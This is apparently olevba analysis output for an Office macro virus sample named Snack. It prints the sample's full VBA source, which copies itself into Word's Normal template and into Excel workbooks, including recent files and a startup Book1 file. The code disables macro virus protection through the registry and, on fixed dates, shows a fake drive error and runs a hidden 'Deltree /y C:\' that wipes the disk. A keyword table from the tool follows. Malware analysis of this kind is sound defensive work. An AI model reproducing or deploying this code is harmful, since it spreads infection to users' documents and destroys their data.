olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Snack <->>- Poison <->>- Cobra
'Macros By Liton

Private Sub Document_Open()
On Error Resume Next
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set Xla = CreateObject("Excel.Application")
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
IString = NT.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
End If
IString = AD.Lines(1, 1)
If IString <> DString Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
End If
With Options
.VirusProtection = False: .SaveNormalPrompt = False
End With
If System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") <> "0" Then
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End If
If Xla.Name = "Microsoft Excel" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
End If
For i = 1 To 4
GetName = "File" + Trim(Str(i))
FilName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List", GetName)
If FilName <> "" Then
Set GO = GetObject(FilName)
If GO.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines > 0 Then
GO.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines 1, GO.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
End If
GO.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
GO.Save
End If
Next
StartPath = Xla.Application.StartupPath
If UCase(Dir(StartPath + "\Book1.")) <> "BOOK1" Then
Set WrkBook = Xla.Workbooks.Add
WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.SaveAs StartPah & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
WrkBook.Close
Else
Set WrkBook = GetObject(StartPath + "\Book1.")
If WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines > 0 Then
WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines 1, WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
End If
WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.Save
Xla.Quit
End If
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Not ready reading drive C", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub
Private Sub WorkBook_Deactivate()
On Error Resume Next
Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkBook").CodeModule
IString = AW.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
AW.DeleteLines 1, AW.CountOfLines
AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
End If
IString = TW.Lines(1, 1)
If IString <> DString Then
TW.DeleteLines 1, TW.CountOfLines
TW.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
Set WOBJ = CreateObject("Word.Application")
If WOBJ.Name = "Microsoft Word" Then
Set NT = WOBJ.NormalTemplate
MS = NT.Path
If NT.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines > 0 Then
NT.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, NT.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
NT.VBProject.VBComponents("ThisDocument").CodeModule.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
WOBJ.Quit
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Not ready reading drive C", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSOffice.Snack-8ef88738d9776b463aa824dbe90409f5ebd72d66 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
